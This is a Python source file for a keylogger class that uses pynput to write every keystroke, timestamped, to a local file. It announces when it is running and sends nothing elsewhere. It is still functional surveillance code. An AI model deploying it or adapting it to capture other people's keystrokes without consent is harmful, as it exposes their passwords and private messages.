import time
import atexit
from typing import TextIO
from pynput import keyboard


class KeyLogger:
    '''
    A class used to log the keystrokes of the user
    args:
        output_file: str - the path to the file where the keystrokes will be logged
    attributes:
        keyboard_listener: keyboard.Listener - the listener that listens for the keystrokes
        log: TextIO - the file object where the keystrokes will be logged - None if the logger is not running
        start_time: time.time - the time when the logger started - None if the logger is not running
    
    Correct usage:
        Context manager (Preferred):
            with KeyLogger("keystrokes.log"):
                pass # the logger is running
            # the logger has been stopped
        
        Manual:
            logger = KeyLogger("keystrokes.log")
            logger.start() # starts the logger
            logger.stop() # stops the logger

        Manual (alias):
            logger = KeyLogger("keystrokes.log")
            logger() # starts the logger
            logger() # stops the logger
    '''
    
    def __init__(self, output_file: str) -> None:
        atexit.register(self.__del__) # register the destructor to be called when the program exits - last resort
        self.output_file: str = output_file
        self.keyboard_listener: keyboard.Listener = keyboard.Listener(on_press=self._key_pressed)
        self.log: TextIO = None 
        self.start_time: time.time = None
        
    def __call__(self) -> None:
        '''
        Alias for the start method - starts the logger and the keyboard listener
        '''
        if self.log is None:
            self.start()
        else:
            self.stop()
            
    def _key_pressed(self, key: str) -> None:
        '''
        Method that is called when a key is pressed - logs the key to the log file
        '''
        self.log.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]: {key}\n')
        
    def start(self) -> None:
        '''
        Starts the logger and the keyboard listener
        '''
        if self.log is None:
            self.log = open(self.output_file, "w")
            self.keyboard_listener.start()
            self.start_time = time.strftime("%Y-%m-%d %H:%M:%S")
            print(f"The logger is running. The keystrokes are being logged to '{self.output_file}'")
        else:
            print(f"The logger is already running: since {self.start_time}")        
    
    def stop(self) -> None:
        '''
        Stops the logger and the keyboard listener
        '''
        if self.log is None:
            print("The logger is not running")
        else:
            self.keyboard_listener.stop()
            self.log.close()
            self.log = None
            print(f"The logger has been stopped. The keystrokes have been logged to '{self.output_file}' since {self.start_time}")
            self.start_time = None
    
    # -----Magic methods-----
    
    def __del__(self) -> None:
        '''
        Destructor - closes the file if the logger is running
        '''
        if self.log is not None:
            self.stop()
            
    def __enter__(self) -> None:
        '''
        Alias for the start method - starts the logger and the keyboard listener
        '''
        self.start()
    
    def __exit__(self, *args, **kwargs) -> None:
        '''
        Exit method - closes the file if the logger is running
        '''
        if self.log is not None:
            self.stop()

    
